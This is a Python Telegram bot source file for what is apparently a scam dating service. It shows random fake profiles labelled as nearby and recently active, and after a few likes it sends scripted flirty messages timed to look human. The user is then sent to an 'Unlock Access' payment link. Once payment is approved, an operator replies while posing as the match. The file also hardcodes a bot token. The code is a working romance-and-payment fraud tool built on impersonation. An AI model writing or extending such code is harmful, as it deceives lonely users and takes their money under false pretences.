import telebot
import json
import random
import threading
import time

from telebot.types import ReplyKeyboardMarkup, ReplyKeyboardRemove
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8747771643:AAHTIAHqKjQhDBiUyNFmCgOLrUva16eGggM"

PAYMENT_ADMINS = [526264365]
CHAT_ADMINS = [526264365]

bot = telebot.TeleBot(TOKEN)

with open("profiles.json", "r") as f:
    profiles = json.load(f)

user_data = {}
shown_profiles = {}
likes = {}
user_paid = {}
matched_profiles = {}
active_match = {}
user_mode = {}
match_index = {}
chat_map = {}
current_match = {}
daily_likes = {}

# START
@bot.message_handler(commands=['start'])
def start(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("Continue")
    bot.send_message(message.chat.id, "Welcome 👋\nClick Continue", reply_markup=markup)

# MAIN
@bot.message_handler(func=lambda message: True)
def all_messages(message):
    user_id = message.chat.id
    text = message.text.strip()

    if text == "matchtest":
        delayed_match(user_id)
        return
    
    # 🧠 Normal user data setup
    if user_id not in shown_profiles:
        shown_profiles[user_id] = []
        likes[user_id] = []
        user_paid[user_id] = False
        matched_profiles[user_id] = []
        active_match[user_id] = False
        user_mode[user_id] = "browse"
        match_index[user_id] = 0

    # FLOW
    if text == "Continue":
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("Yes, I am 18+", "No")
        bot.send_message(user_id, "Are you 18+?", reply_markup=markup)

    elif text == "Yes, I am 18+":
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("I am Male", "I am Female")
        bot.send_message(user_id, "Select gender", reply_markup=markup)

    elif text in ["I am Male", "I am Female"]:
        user_data[user_id] = {}
        bot.send_message(user_id, "Enter your name:", reply_markup=ReplyKeyboardRemove())

    elif user_id in user_data and "name" not in user_data[user_id]:
        user_data[user_id]["name"] = text
        bot.send_message(user_id, "Enter city:")

    elif user_id in user_data and "city" not in user_data[user_id]:
        user_data[user_id]["city"] = text
        bot.send_message(user_id, "Send photo")

    # LIKE
    elif text == "💚 Interested":
        # 🔥 LIKE LIMIT CHECK
        if daily_likes.get(user_id, 0) >= 5:
            bot.send_message(user_id, "❌ Daily limit reached\n🔥 Unlock to continue")
            return

        if shown_profiles[user_id]:
            last_profile = shown_profiles[user_id][-1]
            likes[user_id].append(last_profile)

            # 🔥 count increase
            daily_likes[user_id] = daily_likes.get(user_id, 0) + 1

            if len(likes[user_id]) >= random.randint(2, 4) and not active_match[user_id]:
                active_match[user_id] = True
                threading.Thread(target=delayed_match, args=(user_id,)).start()
            else:
                send_random_profile(user_id)

    elif text == "❌ Not Now":
        send_random_profile(user_id)

    # UNLOCK
    elif text == "🔓 Unlock Access":
        bot.send_message(
            user_id,
            "Activate your access here 👇\nhttps://midnightmatch.creatorapp.club?callback=/fan-home?tier=998255026087117578\n\nSend screenshot 📸"
        )

    # MATCHES
    elif text == "💖 Matches":
        user_mode[user_id] = "match"
        show_match_profile(user_id)

    # NEXT
    elif text == "➡️ Next":
        if user_mode[user_id] == "match":
            show_match_profile(user_id)
        else:
            send_random_profile(user_id)

    # CHAT BUTTON
    elif text == "💬 Chat":
        bot.send_chat_action(user_id, "typing")
        time.sleep(2)
        bot.send_message(user_id, "Hey 😊")
        time.sleep(1)
        bot.send_chat_action(user_id, "typing")
        time.sleep(2)
        bot.send_message(user_id, "Nice to connect with you 💚")

    # USER CHAT → ADMIN
    elif user_paid.get(user_id):
        match_name = current_match.get(user_id, {}).get("name", "Unknown")

        for admin in CHAT_ADMINS:
            sent = bot.send_message(
                admin,
                f"👤 {message.from_user.first_name}\n💘 Match: {match_name}\n🆔 {user_id}\n\n💬 {text}"
            )
            chat_map[sent.message_id] = user_id

# PHOTO
@bot.message_handler(content_types=['photo'])
def photo_handler(message):
    user_id = message.chat.id
    file_id = message.photo[-1].file_id

    bot.send_message(user_id, f"FILE ID:\n{file_id}")

    # 1️⃣ profile photo
    if user_id in user_data and "photo" not in user_data[user_id]:
        user_data[user_id]["photo"] = file_id
        bot.send_message(user_id, "Profile created ✅")
        send_random_profile(user_id)

    # 2️⃣ chat photo (after unlock)
    elif user_paid.get(user_id):
        for admin in CHAT_ADMINS:
            sent = bot.send_photo(
                admin,
                file_id,
                caption=f"👤 {message.from_user.first_name}\n🆔 {user_id}"
            )
            chat_map[sent.message_id] = user_id

    # 3️⃣ payment screenshot
    else:
        bot.send_message(user_id, "⏳ Verification in progress...")

        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
            InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")
        )

        for admin in PAYMENT_ADMINS:
            bot.send_photo(admin, file_id, caption=f"User ID: {user_id}", reply_markup=markup)
# CALLBACK
@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    user_id = int(call.data.split("_")[1])

    if call.data.startswith("approve"):
        user_paid[user_id] = True

        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("💖 Matches", "➡️ Next")

        bot.send_message(
            user_id,
            "🎉 Access activated!\n\n💬 Your matches are waiting",
            reply_markup=markup
        )

    elif call.data.startswith("reject"):
        bot.send_message(user_id, "❌ Verification failed")

# MATCH SYSTEM
def delayed_match(user_id):
    time.sleep(random.randint(5, 10))

    if user_id not in likes or not likes[user_id]:
        profile = random.choice(profiles)
    else:
        profile_id = random.choice(likes[user_id])
        profile = next(p for p in profiles if p["id"] == profile_id)

    current_match[user_id] = profile
    matched_profiles[user_id].append(profile)

    # 💚 Match notification
    bot.send_message(user_id, f"💚 {profile['name']} is interested in you")

    time.sleep(2)

    # 🔥 RANDOM MESSAGES LIST
    messages = [
        "Hey 😊",
        "Hi...",
        "You look interesting...",
        "Where are you from?",
        "What are you doing right now?",
        "I was bored 😅",
        "Finally someone decent here 😌",
        "Are you real or fake? 😜",
        "Tell me something about you",
        "You seem different..."
    ]

    # 🔥 RANDOM NUMBER OF MESSAGES (1 to 3)
    num_msgs = random.randint(1, 3)

    for msg in random.sample(messages, num_msgs):
        bot.send_chat_action(user_id, "typing")

        # 🔥 RANDOM HUMAN DELAY
        delay = random.randint(3, 12)
        time.sleep(delay)

        bot.send_message(user_id, f"{profile['name']}: {msg}")

        # 🔥 कभी extra pause
        if random.random() < 0.4:
            time.sleep(random.randint(5, 15))

    # 🔒 Lock (LOOP KE BAHAR)
    time.sleep(2)
    bot.send_message(user_id, "🔒 Unlock full access to continue")

    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🔓 Unlock Access")

    bot.send_message(user_id, "Continue 👇", reply_markup=markup)

    active_match[user_id] = False

# RANDOM PROFILE
def send_random_profile(user_id):
    available = [p for p in profiles if p["id"] not in shown_profiles[user_id]]

    if not available:
        bot.send_message(user_id, "No more profiles")
        return

    profile = random.choice(available)
    shown_profiles[user_id].append(profile["id"])

    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("💚 Interested", "❌ Not Now")

    # 🔥 Dynamic active time
    minutes = random.randint(1, 59)

    # 🔥 Bio system
    interests = [
        "Coffee", "Gym", "Music", "Travel", "Netflix", "Food",
        "Shopping", "Dancing", "Photography", "Cooking",
        "Reading", "Movies", "Long drives", "Adventure",
        "Beach vibes", "Night walks"
    ]

    personality = [
        "shy 😅", "funny 😄", "moody 😌", "romantic 💕",
        "talkative 😜", "calm 😊", "wild sometimes 😈",
        "introvert 🙃", "extrovert 😎", "sweet 😇"
    ]

    extras = [
        "late night talks 🌙", "long chats 💬", "good vibes ✨",
        "deep conversations 🖤", "random talks 😆",
        "voice calls sometimes 📞", "memes lover 😂",
        "secretly crazy 🤫", "flirty mood 😏",
        "need someone interesting 😉"
    ]

    # 🔥 Smart bio (kabhi short kabhi long)
    if random.random() < 0.3:
        bio = f"{random.choice(interests)} lover | {random.choice(personality)}"
    else:
        bio = f"{random.choice(interests)} lover | {random.choice(personality)} | {random.choice(extras)}"

    # 🔥 Final caption
    caption = f"""✨ {profile['name']}
Age: {profile['age']}

🟢 Active {minutes} mins ago
📍 Nearby you

Bio:
{bio}
"""

    bot.send_photo(
        user_id,
        profile["photo"],
        caption=caption,
        reply_markup=markup
    )# MATCH VIEW
def show_match_profile(user_id):
    if not matched_profiles[user_id]:
        bot.send_message(user_id, "No matches yet")
        return

    if user_id not in match_index:
        match_index[user_id] = 0

    if match_index[user_id] >= len(matched_profiles[user_id]):
        match_index[user_id] = 0

    profile = matched_profiles[user_id][match_index[user_id]]
    match_index[user_id] += 1

    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("💬 Chat", "➡️ Next")

    bot.send_photo(
        user_id,
        profile["photo"],
        caption=f"{profile['name']}, {profile['age']}",
        reply_markup=markup
    )
# ADMIN REPLY
@bot.message_handler(func=lambda message: message.chat.id in CHAT_ADMINS and message.reply_to_message)
def admin_reply(message):
    try:
        reply_msg_id = message.reply_to_message.message_id

        if reply_msg_id in chat_map:
            user_id = chat_map[reply_msg_id]
            bot.send_message(user_id, message.text)

    except Exception as e:
        print(e)


bot.polling()